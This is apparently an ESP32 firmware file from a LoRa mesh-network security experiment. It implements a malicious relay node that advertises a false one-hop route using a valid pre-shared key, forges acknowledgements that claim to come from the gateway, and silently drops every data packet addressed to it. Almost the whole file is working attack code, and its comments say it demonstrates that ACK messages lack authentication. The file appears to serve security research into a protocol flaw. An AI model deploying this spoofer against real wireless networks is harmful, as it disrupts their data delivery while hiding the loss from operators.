// E8 — Node C: ACK SPOOFER (relay-position attacker)
//
// Operates as a legitimate-looking relay (holds valid PSK, signs Hellos).
// When data arrives addressed to this node (as next hop), sends a forged
// ACK back to sender claiming to be the gateway (src=0xBB), then DROPS
// the data — gateway receives nothing.
//
// Sender sees: 100% "delivery" (ACKs arrive for every packet)
// Gateway sees: 0 packets (PDR=0%)
// Discrepancy proves: ACK authenticity is not verified by HMAC patch.
//
// SECURITY_MODE=1 (patched) nodes accept this attack because:
//   - Hello from 0xCC has valid HMAC (uses sign_hello with NETWORK_PSK)
//   - Data HMAC check passes (data was signed by honest sender)
//   - AckMsg has NO HMAC field — forgery is undetectable
//
// Expected serial output:
//   [SPOOFER] DATA from 0xAA pkt_id=N → forging ACK(src=0xBB)
//   [SPOOFER] DROP data (total_dropped=N, total_forged_acks=N)
//   [SPOOFER] Sender thinks PDR=100%, Gateway sees PDR=0%
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID      0xCC
#define GATEWAY_ID   0xBB
#define ATTACK_PERIOD_MS  9000   // Hello slightly before gateway's 10s

#include "../e8_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint16_t atk_seq      = 0;
uint32_t drop_count   = 0;
uint32_t forged_acks  = 0;
uint32_t hello_count  = 0;
uint32_t last_atk     = 0;
uint32_t last_oled    = 0;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  ACK SPOOF");
  char buf[32];
  snprintf(buf, sizeof(buf), "ACK forg=%lu", forged_acks);
  oled.drawString(0, 14, buf);
  snprintf(buf, sizeof(buf), "DROP=%lu", drop_count);
  oled.drawString(0, 28, buf);
  oled.drawString(0, 42, "No HMAC on ACK!");
  oled.display();
}

void send_relay_hello() {
  HelloMsg h = {};
  h.type   = MSG_HELLO;
  h.src    = NODE_ID;
  h.dst_gw = GATEWAY_ID;
  h.metric = 1;        // claim metric=1: "I am one hop from gateway"
  h.seq    = atk_seq++;
  sign_hello(&h);      // valid HMAC — honest-looking relay
  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  hello_count++;
  Serial.printf("[SPOOFER] Hello sent metric=1 seq=%u (#%lu) — looks like honest relay\n",
                h.seq, hello_count);
}

void forge_ack(uint8_t real_src, uint16_t pkt_id) {
  // Forge ACK claiming to be from gateway (0xBB)
  // No HMAC in AckMsg — completely undetectable by receiver
  AckMsg a = {};
  a.type   = MSG_ACK;
  a.src    = GATEWAY_ID;   // SPOOFED: claim to be 0xBB
  a.dst    = real_src;     // send back to original sender
  a.pkt_id = pkt_id;

  delay(10);  // small delay mimics real relay latency
  radio->transmit((uint8_t*)&a, sizeof(a));
  radio->startReceive();
  forged_acks++;

  Serial.printf("[SPOOFER] Forged ACK: src=0xBB(fake) dst=0x%02X pkt_id=%u (total=%lu)\n",
                real_src, pkt_id, forged_acks);
  Serial.println("[SPOOFER] Sender believes delivery confirmed. Data actually DROPPED.");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E8 Node C (ACK SPOOFER) ===");
  Serial.println("[INFO] Operates as relay, forges ACK from 0xBB, drops data.");
  Serial.println("[INFO] Finding: AckMsg has no HMAC — forgery undetectable by HMAC patch.");

  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();
  oled_draw();

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st);
    while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");

  delay(200);
  send_relay_hello();
  last_atk = millis();
}

void loop() {
  uint32_t now = millis();
  if (now - last_atk  >= ATTACK_PERIOD_MS) { last_atk  = now; send_relay_hello(); }
  if (now - last_oled >= 5000)             { last_oled = now; oled_draw(); }

  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[256];
    size_t  pkt_len = radio->getPacketLength();
    int     state   = radio->readData(buf, sizeof(buf));
    radio->startReceive();
    if (state != RADIOLIB_ERR_NONE || pkt_len == 0) return;

    if (buf[0] == MSG_DATA && pkt_len >= sizeof(DataMsg)) {
      DataMsg *d = (DataMsg*)buf;
      if (d->dst != NODE_ID) return;   // only intercept packets addressed to us

      // Verify data HMAC to confirm packet is genuine (optional check)
      if (!check_data(d)) {
        Serial.printf("[DROP] DATA from 0x%02X: HMAC FAILED (ignoring)\n", d->src);
        return;
      }

      // Core attack: forge ACK, drop data
      drop_count++;
      Serial.printf("[SPOOFER] DATA from 0x%02X pkt_id=%u (drop #%lu)\n",
                    d->src, d->pkt_id, drop_count);
      forge_ack(d->src, d->pkt_id);
      Serial.printf("[SPOOFER] Sender PDR=~100%% / Gateway PDR=0%%  (dropped=%lu forged=%lu)\n",
                    drop_count, forged_acks);
      oled_draw();

    } else if (buf[0] == MSG_HELLO && pkt_len >= sizeof(HelloMsg)) {
      HelloMsg *h = (HelloMsg*)buf;
      if (h->src != NODE_ID) {
        Serial.printf("[SNIFF] Hello from 0x%02X metric=%u seq=%u\n",
                      h->src, h->metric, h->seq);
      }
    }
  }
}
